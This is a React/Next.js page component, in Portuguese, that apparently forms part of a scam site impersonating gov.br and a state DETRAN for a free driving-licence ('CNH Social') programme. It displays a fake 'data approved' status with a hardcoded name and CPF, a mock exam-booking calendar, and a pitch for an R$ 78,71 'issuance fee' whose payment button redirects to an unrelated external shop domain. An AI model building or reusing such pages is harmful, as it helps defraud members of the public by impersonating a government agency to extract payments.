"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import Link from "next/link"
import { Button } from "@/components/ui/button"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Menu, Search, Mic, User, ChevronRight, Check, X, Info, ChevronLeft, ChevronRightIcon } from "lucide-react"

export default function DadosAprovadosPage() {
  const [isAuthorized, setIsAuthorized] = useState(false)
  const [showCalendar, setShowCalendar] = useState(false)
  const [selectedDate, setSelectedDate] = useState<number | null>(null)
  const [examsScheduled, setExamsScheduled] = useState(false)
  const [currentMonth, setCurrentMonth] = useState(new Date().getMonth())
  const [currentYear, setCurrentYear] = useState(new Date().getFullYear())
  const router = useRouter()

  // Dados simulados do usuário
  const userData = {
    nome: "Arthur Silva Santos",
    cpf: "01472862635",
    protocolo: "AZI-603276",
  }

  // Gerar datas disponíveis (sempre após hoje)
  const getAvailableDates = () => {
    const today = new Date()
    const availableDates = []

    // Adicionar datas disponíveis nos próximos 30 dias (exceto fins de semana)
    for (let i = 1; i <= 30; i++) {
      const date = new Date(today)
      date.setDate(today.getDate() + i)

      // Pular fins de semana
      if (date.getDay() !== 0 && date.getDay() !== 6) {
        if (date.getMonth() === currentMonth && date.getFullYear() === currentYear) {
          availableDates.push(date.getDate())
        }
      }
    }

    return availableDates
  }

  const availableDates = getAvailableDates()
  const monthNames = [
    "Janeiro",
    "Fevereiro",
    "Março",
    "Abril",
    "Maio",
    "Junho",
    "Julho",
    "Agosto",
    "Setembro",
    "Outubro",
    "Novembro",
    "Dezembro",
  ]

  useEffect(() => {
    // Verificar se o usuário selecionou autoescola
    const autoescolaSelecionada = sessionStorage.getItem("autoescola-selecionada")
    if (!autoescolaSelecionada) {
      router.push("/autoescola-parceira")
      return
    }
    setIsAuthorized(true)
  }, [router])

  const handleMarcarExames = () => {
    setShowCalendar(true)
  }

  const handleDateSelect = (date: number) => {
    setSelectedDate(date)
  }

  const handleRealizarAgendamento = () => {
    if (selectedDate) {
      setExamsScheduled(true)
      setShowCalendar(false)

      // Scroll automático para o botão de pagamento após 1 segundo
      setTimeout(() => {
        const paymentButton = document.getElementById("payment-button")
        if (paymentButton) {
          paymentButton.scrollIntoView({ behavior: "smooth" })
        }
      }, 1000)
    }
  }

  const handleIniciarPagamento = () => {
    sessionStorage.setItem("exames-agendados", "true")
    window.location.href = "https://go.disruptybr.shop/m7bqpdhz09"
  }

  // Gerar calendário
  const generateCalendar = () => {
    const firstDay = new Date(currentYear, currentMonth, 1)
    const lastDay = new Date(currentYear, currentMonth + 1, 0)
    const startDate = new Date(firstDay)
    startDate.setDate(startDate.getDate() - firstDay.getDay())

    const calendar = []
    const current = new Date(startDate)

    for (let week = 0; week < 6; week++) {
      const weekDays = []
      for (let day = 0; day < 7; day++) {
        const date = current.getDate()
        const isCurrentMonth = current.getMonth() === currentMonth
        const isAvailable = isCurrentMonth && availableDates.includes(date)
        const isSelected = selectedDate === date && isCurrentMonth

        weekDays.push({
          date,
          isCurrentMonth,
          isAvailable,
          isSelected,
          fullDate: new Date(current),
        })
        current.setDate(current.getDate() + 1)
      }
      calendar.push(weekDays)
    }

    return calendar
  }

  if (!isAuthorized) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <p className="text-gray-600">Carregando...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header gov.br logado */}
      <div className="bg-white border-b">
        <div className="max-w-md mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center">
              <img src="/images/govbr-logo.png" alt="gov.br" className="h-8" />
            </div>
            <div className="flex items-center gap-2">
              <Button variant="ghost" size="icon">
                <Menu className="w-5 h-5" />
              </Button>
              <img src="/images/header-icons.png" alt="Ícones do cabeçalho" className="h-6" />
              <Button className="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-full">
                <User className="w-4 h-4 mr-2" />
                Arthur
              </Button>
            </div>
          </div>
        </div>
      </div>

      {/* Header do Departamento */}
      <div className="bg-white border-b">
        <div className="max-w-md mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center">
              <Button variant="ghost" size="icon" className="mr-2">
                <Menu className="w-5 h-5 text-blue-600" />
              </Button>
              <h1 className="text-lg font-semibold text-gray-800">Departamento Estadual de Trânsito</h1>
            </div>
            <div className="flex items-center gap-2">
              <Button variant="ghost" size="icon">
                <Mic className="w-5 h-5 text-blue-600" />
              </Button>
              <Button variant="ghost" size="icon">
                <Search className="w-5 h-5 text-blue-600" />
              </Button>
            </div>
          </div>
        </div>
      </div>

      {/* Breadcrumb */}
      <div className="max-w-md mx-auto px-4 py-3">
        <div className="flex items-center text-sm text-blue-600">
          <Link href="/" className="hover:underline">
            Início
          </Link>
          <ChevronRight className="w-4 h-4 mx-1" />
          <Link href="/servicos" className="hover:underline">
            Serviços
          </Link>
          <ChevronRight className="w-4 h-4 mx-1" />
          <Link href="/cnh" className="hover:underline">
            CNH
          </Link>
          <ChevronRight className="w-4 h-4 mx-1" />
          <span className="text-gray-600">CNH Social Digital</span>
        </div>
      </div>

      {/* Conteúdo principal */}
      <div className="max-w-md mx-auto px-4 pb-8">
        {/* Título com logo DETRAN */}
        <div className="flex items-center justify-between mb-8">
          <div>
            <h1 className="text-3xl font-bold text-blue-900 mb-2">Seus dados</h1>
            <h2 className="text-3xl font-bold text-blue-900">foram aprovados</h2>
          </div>
          <div className="flex-shrink-0">
            <img src="/images/detran-oficial.png" alt="DETRAN" className="h-12" />
          </div>
        </div>

        {/* Taxa de Emissão */}
        <div className="bg-blue-50 border-l-4 border-l-blue-600 p-6 mb-8">
          <div className="flex items-center gap-3 mb-4">
            <Info className="w-6 h-6 text-blue-600" />
            <h3 className="text-xl font-bold text-blue-900">Taxa de Emissão e Ativação Digital</h3>
          </div>

          <p className="text-gray-700 mb-4">
            Para validar sua participação no programa, é necessária a contribuição simbólica única de{" "}
            <span className="font-bold text-blue-700">R$ 78,71</span>.
          </p>

          <p className="text-gray-700 mb-4">Esse valor assegurar:</p>

          <ul className="list-disc list-inside text-gray-700 mb-4 space-y-1">
            <li>Emissão da CNH Digital</li>
            <li>Acesso à plataforma nacional</li>
            <li>Custos de integração com órgãos de trânsito</li>
          </ul>

          <p className="text-gray-600 text-sm italic">
            (Taxa exigida para manter a organização e credibilidade do projeto.)
          </p>
        </div>

        {/* Dados validados no SNR */}
        <div className="bg-blue-50 p-6 mb-8">
          <h3 className="text-xl font-bold text-gray-800 mb-4">
            Dados validado com sucesso no Sistema Nacional de Benefícios (SNR)
          </h3>
          <p className="text-gray-700 leading-relaxed">
            Parabéns <span className="font-bold">Não</span> você foi aprovado com sucesso e já pode marcar seu exame
            médico e psicotécnicos! A conclusão dessa verificação é essencial para a liberação das aulas teóricas e
            práticas na autoescola parceira.
          </p>
        </div>

        {/* Acompanhamento do Processo */}
        <div className="mb-8">
          <h3 className="text-2xl font-bold text-blue-900 mb-6">Acompanhamento do Processo</h3>

          <div className="space-y-4 mb-6">
            <div className="flex justify-between">
              <span className="font-semibold text-gray-700">Nome Completo:</span>
              <span className="text-blue-700 font-semibold">{userData.nome}</span>
            </div>
            <div className="flex justify-between">
              <span className="font-semibold text-gray-700">CPF:</span>
              <span className="text-blue-700 font-semibold">{userData.cpf}</span>
            </div>
            <div className="flex justify-between">
              <span className="font-semibold text-gray-700">PROTOCOLO:</span>
              <span className="text-blue-700 font-semibold">{userData.protocolo}</span>
            </div>
          </div>

          {/* Informação sobre agendamento */}
          <div className="bg-blue-50 border-l-4 border-l-blue-600 p-4 mb-6">
            <div className="flex items-start gap-3">
              <Info className="w-5 h-5 text-blue-600 mt-0.5 flex-shrink-0" />
              <p className="text-gray-700 text-sm leading-relaxed">
                Após a confirmação do pagamento da taxa de emissão, o sistema realizará automaticamente o agendamento
                dos exames obrigatórios em clínicas credenciadas ao programa. Todas as instruções necessárias para a
                realização dos exames e início das aulas teóricas e práticas serão enviadas ao seu e-mail cadastrado.
              </p>
            </div>
          </div>

          {/* Status dos exames */}
          <div className="space-y-4 mb-6">
            <div className="flex items-center gap-4">
              <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center">
                <Check className="w-5 h-5 text-white" />
              </div>
              <span className="text-gray-800 font-medium">Dados validados</span>
            </div>

            <div className="flex items-center gap-4">
              <div
                className={`w-8 h-8 rounded-full flex items-center justify-center ${
                  examsScheduled ? "bg-green-500" : "bg-red-500"
                }`}
              >
                {examsScheduled ? <Check className="w-5 h-5 text-white" /> : <X className="w-5 h-5 text-white" />}
              </div>
              <span className="text-gray-800 font-medium">Exame psicotécnico {examsScheduled ? "Agendado" : ""}</span>
              <Button variant="ghost" size="icon" className="ml-auto">
                <Info className="w-5 h-5 text-blue-600" />
              </Button>
            </div>

            <div className="flex items-center gap-4">
              <div
                className={`w-8 h-8 rounded-full flex items-center justify-center ${
                  examsScheduled ? "bg-green-500" : "bg-red-500"
                }`}
              >
                {examsScheduled ? <Check className="w-5 h-5 text-white" /> : <X className="w-5 h-5 text-white" />}
              </div>
              <span className="text-gray-800 font-medium">Exame médico {examsScheduled ? "Agendado" : ""}</span>
              <Button variant="ghost" size="icon" className="ml-auto">
                <Info className="w-5 h-5 text-blue-600" />
              </Button>
            </div>
          </div>

          {/* Botão Marcar Exames */}
          {!examsScheduled && (
            <Button
              onClick={handleMarcarExames}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white py-4 rounded-full text-lg font-semibold mb-8"
            >
              MARCAR EXAMES
            </Button>
          )}
        </div>

        {/* Explicação sobre a taxa */}
        <div className="mb-8">
          <h3 className="text-2xl font-bold text-blue-700 text-center mb-6">
            Por que existe uma taxa, se o programa é gratuito?
          </h3>
          <p className="text-gray-700 leading-relaxed text-center">
            Essa medida, adotada em parceria com autoescolas de todo o Brasil, visa evitar solicitações indevidas e
            garantir que o benefício chegue a quem de fato deseja obter sua primeira habilitação. Com isso, conseguimos
            manter a organização, o atendimento qualificado e a continuidade do projeto para todos que sonham em
            conquistar sua CNH.
          </p>
        </div>

        {/* Botão Iniciar Pagamento */}
        <Button
          id="payment-button"
          onClick={handleIniciarPagamento}
          className="w-full bg-blue-600 hover:bg-blue-700 text-white py-4 rounded-full text-lg font-semibold"
        >
          Iniciar Pagamento
        </Button>
      </div>

      {/* Modal do Calendário */}
      <Dialog open={showCalendar} onOpenChange={setShowCalendar}>
        <DialogContent className="max-w-md mx-auto">
          <DialogHeader>
            <DialogTitle className="text-xl font-bold text-blue-900">AGENDAR AVALIAÇÃO</DialogTitle>
          </DialogHeader>

          <div className="p-4">
            {/* Navegação do mês */}
            <div className="flex items-center justify-between mb-6">
              <Button
                variant="ghost"
                size="icon"
                onClick={() => {
                  if (currentMonth === 0) {
                    setCurrentMonth(11)
                    setCurrentYear(currentYear - 1)
                  } else {
                    setCurrentMonth(currentMonth - 1)
                  }
                }}
              >
                <ChevronLeft className="w-5 h-5" />
              </Button>

              <h3 className="text-xl font-semibold text-blue-900">
                {monthNames[currentMonth]} {currentYear}
              </h3>

              <Button
                variant="ghost"
                size="icon"
                onClick={() => {
                  if (currentMonth === 11) {
                    setCurrentMonth(0)
                    setCurrentYear(currentYear + 1)
                  } else {
                    setCurrentMonth(currentMonth + 1)
                  }
                }}
              >
                <ChevronRightIcon className="w-5 h-5" />
              </Button>
            </div>

            {/* Cabeçalho dos dias da semana */}
            <div className="grid grid-cols-7 gap-1 mb-4">
              {["DOM", "SEG", "TER", "QUA", "QUI", "SEX", "SAB"].map((day) => (
                <div key={day} className="text-center text-sm font-medium text-gray-600 py-2">
                  {day}
                </div>
              ))}
            </div>

            {/* Calendário */}
            <div className="space-y-1">
              {generateCalendar().map((week, weekIndex) => (
                <div key={weekIndex} className="grid grid-cols-7 gap-1">
                  {week.map((day, dayIndex) => (
                    <button
                      key={dayIndex}
                      onClick={() => day.isAvailable && handleDateSelect(day.date)}
                      disabled={!day.isAvailable}
                      className={`
                        h-10 w-10 rounded-full text-sm font-medium transition-colors
                        ${!day.isCurrentMonth ? "text-gray-300" : ""}
                        ${day.isAvailable ? "text-blue-900 hover:bg-blue-100" : "text-gray-400"}
                        ${day.isSelected ? "bg-blue-600 text-white" : ""}
                        ${day.isAvailable && !day.isSelected ? "bg-blue-50" : ""}
                      `}
                    >
                      {day.date}
                    </button>
                  ))}
                </div>
              ))}
            </div>

            {/* Botão de agendamento */}
            <Button
              onClick={handleRealizarAgendamento}
              disabled={!selectedDate}
              className={`w-full mt-6 py-3 rounded-full text-lg font-semibold ${
                selectedDate
                  ? "bg-blue-600 hover:bg-blue-700 text-white"
                  : "bg-gray-300 text-gray-500 cursor-not-allowed"
              }`}
            >
              REALIZAR AGENDAMENTO
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  )
}
